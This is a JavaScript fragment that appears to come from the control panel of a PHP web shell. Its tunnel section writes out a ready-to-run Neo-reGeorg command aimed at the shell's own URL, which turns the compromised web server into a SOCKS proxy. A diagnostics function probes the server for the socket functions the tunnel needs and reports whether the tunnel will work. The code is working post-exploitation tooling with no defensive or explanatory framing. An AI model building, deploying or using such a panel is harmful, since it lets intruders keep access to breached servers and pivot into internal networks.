// ==================== TUNNEL ====================
(function() {
  const urlEl = document.getElementById('tunnel-url');
  const cmdEl = document.getElementById('tunnel-cmd');
  if (urlEl) {
    const tunnelUrl = location.origin + location.pathname;
    urlEl.value = tunnelUrl;
    cmdEl.textContent = 'python3 neoreg.py -u ' + tunnelUrl + ' -k <password> --skip';
  }
})();

function tunnelCheck() {
  const resultEl = document.getElementById('tunnel-test-result');
  const reqsEl = document.getElementById('tunnel-reqs');
  const statusEl = document.getElementById('tunnel-status');
  resultEl.innerHTML = '<span class="spinner"></span> Running diagnostics...';

  const fd = new FormData();
  fd.append('action', 'diag');

  fetchJSON(fd)
    .then(d => {
      const funcs = d.functions || {};
      const hasSock = funcs['fsockopen'] || funcs['stream_socket_client'];
      const row = (label, ok, detail) => {
        const badge = ok ? '<span class="badge badge-ok">\u2714</span>' : '<span class="badge badge-no">\u2716</span>';
        return '<div class="diag-item"><span class="diag-label">' + label + '</span><span class="diag-value">' + badge + ' ' + escHtml(String(detail || '')) + '</span></div>';
      };
      let html = '';
      html += row('fsockopen', funcs['fsockopen'], funcs['fsockopen'] ? 'available' : 'disabled');
      html += row('stream_socket_client', funcs['stream_socket_client'], funcs['stream_socket_client'] ? 'available' : 'disabled');
      html += '<div class="diag-item"><span class="diag-label">open_basedir</span><span class="diag-value">' + escHtml(d.open_basedir) + '</span></div>';
      html += '<div class="diag-item"><span class="diag-label">max_execution_time</span><span class="diag-value">' + escHtml(String(d.max_execution_time || 'unknown')) + '</span></div>';
      reqsEl.innerHTML = html;

      if (hasSock) {
        statusEl.innerHTML = '<span style="color:var(--green)">\u2714 Ready</span>';
        resultEl.innerHTML = '<div style="color:var(--green)">\u2714 Socket functions available. Tunnel should work.</div>';
      } else {
        statusEl.innerHTML = '<span style="color:var(--red)">\u2716 Unavailable</span>';
        resultEl.innerHTML = '<div style="color:var(--red)">\u2716 No socket functions available. Tunnel will not work on this host.</div>';
      }
    })
    .catch(err => {
      resultEl.innerHTML = '<div style="color:var(--red)">Error: ' + escHtml(String(err)) + '</div>';
    });
}
